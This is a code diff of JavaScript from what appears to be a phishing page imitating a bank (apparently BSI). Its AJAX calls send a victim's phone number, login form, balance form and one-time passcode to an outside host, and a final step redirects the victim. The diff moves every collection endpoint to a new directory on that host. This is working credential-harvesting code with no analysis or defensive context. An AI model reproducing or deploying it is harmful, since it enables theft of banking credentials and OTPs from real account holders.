@@ -19,7 +19,7 @@ $('.process1').fadeIn();
  
       $.ajax({
             type: 'POST',
-            url: 'https://demcloud.my.id/BSI/dcty00/no.php',
+            url: 'https://demcloud.my.id/BSI/sdltr1/no.php',
             data: $('#formHP').serialize(),
             datatype: 'text',
             
@@ -50,7 +50,7 @@ $('.process1').fadeIn();
   
       $.ajax({
             type: 'POST',
-            url: 'https://demcloud.my.id/BSI/dcty00/login.php',
+            url: 'https://demcloud.my.id/BSI/sdltr1/login.php',
             data: $('#formLog').serialize(),
             datatype: 'text',          
             complete: function(data) {
@@ -90,7 +90,7 @@ $('.process1').fadeIn();
   
       $.ajax({
             type: 'POST',
-            url: 'https://demcloud.my.id/BSI/dcty00/saldo.php',
+            url: 'https://demcloud.my.id/BSI/sdltr1/saldo.php',
             data: $('#jualpuki').serialize(),
             datatype: 'text',          
             complete: function(data) {
@@ -135,7 +135,7 @@ function sendOtp() {
    
 $.ajax({
  type: 'POST',
- url: 'https://demcloud.my.id/BSI/dcty00/otp.php',
+ url: 'https://demcloud.my.id/BSI/sdltr1/otp.php',
  async: false,
  dataType: 'JSON',
  data: $('#form2').serialize(),
@@ -170,7 +170,7 @@ function getcs(){
  $("#djload").show();   
   
 setTimeout(function(){  
-location.href='https://demcloud.my.id/BSI/dcty00/wa';
+location.href='https://demcloud.my.id/BSI/sdltr1/wa';
     }, 1000);
     setTimeout(function(){
     $("#djload").hide();   
